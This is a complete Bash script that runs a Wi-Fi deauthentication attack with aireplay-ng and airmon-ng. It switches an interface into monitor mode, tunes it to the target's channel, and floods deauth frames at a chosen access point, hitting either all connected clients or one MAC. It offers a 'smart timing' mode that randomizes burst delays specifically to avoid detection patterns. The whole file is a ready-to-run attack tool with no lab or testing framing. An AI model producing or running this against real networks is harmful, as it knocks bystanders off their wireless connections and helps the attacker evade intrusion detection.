#!/bin/bash

# Deauthentication Attack Script with Enhanced Security and Validation

set -euo pipefail

# Configuration
LOG_FILE="/var/log/iseeyou_attacks.log"
INTERFACE="wlan0"
MONITOR_INTERFACE="${INTERFACE}mon"
TIMEOUT=300  # 5 minutes default timeout

# Logging function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [DEAUTH] $*" | tee -a "$LOG_FILE"
}

# Cleanup function
cleanup() {
    log "Cleaning up and stopping attack..."
    # Stop monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true
    # Kill any remaining aireplay-ng processes
    pkill -f "aireplay-ng.*$MONITOR_INTERFACE" 2>/dev/null || true
    log "Cleanup completed"
}

# Trap for cleanup on exit
trap cleanup EXIT INT TERM

# Validate MAC address
validate_mac() {
    local mac=$1
    if [[ ! $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        log "ERROR: Invalid MAC address format: $mac"
        exit 1
    fi
}

# Validate channel
validate_channel() {
    local channel=$1
    if ! [[ "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 165 ]; then
        log "ERROR: Invalid channel: $channel"
        exit 1
    fi
}

# Check if required tools are installed
check_dependencies() {
    local tools=("aireplay-ng" "airmon-ng" "iwconfig")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log "ERROR: Required tool not found: $tool"
            exit 1
        fi
    done
    log "All required tools are available"
}

# Function to perform deauthentication attack with advanced features
perform_deauth() {
    local target_bssid=$1
    local target_channel=$2
    local duration=$3
    local packets_per_second=$4
    local target_clients=$5
    local smart_timing=$6

    log "Starting advanced deauthentication attack"
    log "Target: $target_bssid, Channel: $target_channel"
    log "Duration: ${duration}s, Rate: ${packets_per_second} pkt/s"
    log "Target Clients: $target_clients, Smart Timing: $smart_timing"

    # Validate inputs
    validate_mac "$target_bssid"
    validate_channel "$target_channel"

    # Check if interface exists
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        log "ERROR: Wireless interface $INTERFACE not found"
        exit 1
    fi

    # Stop any existing monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true

    # Put the wireless interface in monitor mode
    log "Putting wireless interface $INTERFACE in monitor mode..."
    if ! sudo airmon-ng start "$INTERFACE"; then
        log "ERROR: Failed to start monitor mode on $INTERFACE"
        exit 1
    fi

    # Wait for interface to be ready
    sleep 2

    # Change to the target channel
    log "Changing channel to $target_channel..."
    if ! sudo iwconfig "$MONITOR_INTERFACE" channel "$target_channel"; then
        log "ERROR: Failed to set channel $target_channel"
        exit 1
    fi

    # Verify channel was set correctly
    current_channel=$(iwconfig "$MONITOR_INTERFACE" 2>/dev/null | grep "Frequency" | grep -o "Channel [0-9]*" | cut -d' ' -f2 || echo "")
    if [ "$current_channel" != "$target_channel" ]; then
        log "WARNING: Channel verification failed. Expected: $target_channel, Got: $current_channel"
    fi

    # Calculate packet timing
    local packets_per_burst=10
    local delay_between_bursts=$((1000 / packets_per_second))  # milliseconds

    # Build aireplay-ng command based on target clients
    local aireplay_cmd
    if [ "$target_clients" = "all" ]; then
        aireplay_cmd="sudo aireplay-ng --deauth $packets_per_burst -a $target_bssid $MONITOR_INTERFACE"
        log "Targeting all clients connected to $target_bssid"
    else
        validate_mac "$target_clients"
        aireplay_cmd="sudo aireplay-ng --deauth $packets_per_burst -a $target_bssid -c $target_clients $MONITOR_INTERFACE"
        log "Targeting specific client: $target_clients"
    fi

    # Start attack loop with smart timing
    log "Starting deauthentication attack with smart timing..."
    local start_time=$(date +%s)
    local packets_sent=0

    while [ $(($(date +%s) - start_time)) -lt "$duration" ]; do
        # Execute deauth burst
        if eval "$aireplay_cmd" 2>/dev/null; then
            packets_sent=$((packets_sent + packets_per_burst))
            log "Sent $packets_per_burst deauth packets (Total: $packets_sent)"

            # Progress reporting every 50 packets
            if [ $((packets_sent % 50)) -eq 0 ]; then
                local elapsed=$(($(date +%s) - start_time))
                local rate=$((packets_sent / (elapsed > 0 ? elapsed : 1)))
                log "Progress: $packets_sent packets sent, Rate: ${rate} pkt/s"
            fi
        else
            log "WARNING: Failed to send deauth burst, retrying..."
        fi

        # Smart timing: vary delay to avoid detection patterns
        if [ "$smart_timing" = "true" ]; then
            local smart_delay=$((delay_between_bursts + (RANDOM % 500) - 250))
            smart_delay=$((smart_delay > 100 ? smart_delay : 100))  # Minimum 100ms
            sleep "$(echo "scale=3; $smart_delay/1000" | bc)"
        else
            sleep "$(echo "scale=3; $delay_between_bursts/1000" | bc)"
        fi
    done

    local total_time=$(($(date +%s) - start_time))
    local avg_rate=$((packets_sent / (total_time > 0 ? total_time : 1)))

    log "Deauthentication attack completed successfully"
    log "Statistics: $packets_sent packets sent in ${total_time}s"
    log "Average rate: ${avg_rate} packets/second"
}

# Main script
main() {
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then
        log "ERROR: This script must be run as root (sudo)"
        exit 1
    fi

    # Check dependencies
    check_dependencies

    # Validate arguments
    if [ $# -lt 2 ]; then
        log "Usage: $0 <target_bssid> <target_channel> [duration] [packets_per_second] [target_clients] [smart_timing]"
        log "Example: $0 00:11:22:33:44:55 6 300 50 all true"
        exit 1
    fi

    local target_bssid=$1
    local target_channel=$2

    # Optional parameters with defaults
    local duration=${3:-$TIMEOUT}
    local packets_per_second=${4:-10}
    local target_clients=${5:-"all"}
    local smart_timing=${6:-"false"}

    # Validate parameters
    if ! [[ "$duration" =~ ^[0-9]+$ ]] || [ "$duration" -lt 1 ]; then
        log "ERROR: Invalid duration: $duration"
        exit 1
    fi

    if ! [[ "$packets_per_second" =~ ^[0-9]+$ ]] || [ "$packets_per_second" -lt 1 ] || [ "$packets_per_second" -gt 100 ]; then
        log "ERROR: Invalid packets per second: $packets_per_second (1-100)"
        exit 1
    fi

    if [[ "$target_clients" != "all" ]] && ! [[ "$target_clients" =~ ^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$ ]]; then
        log "ERROR: Invalid target clients format: $target_clients"
        exit 1
    fi

    # Execute attack with advanced parameters
    perform_deauth "$target_bssid" "$target_channel" "$duration" "$packets_per_second" "$target_clients" "$smart_timing"
}

# Run main function
main "$@"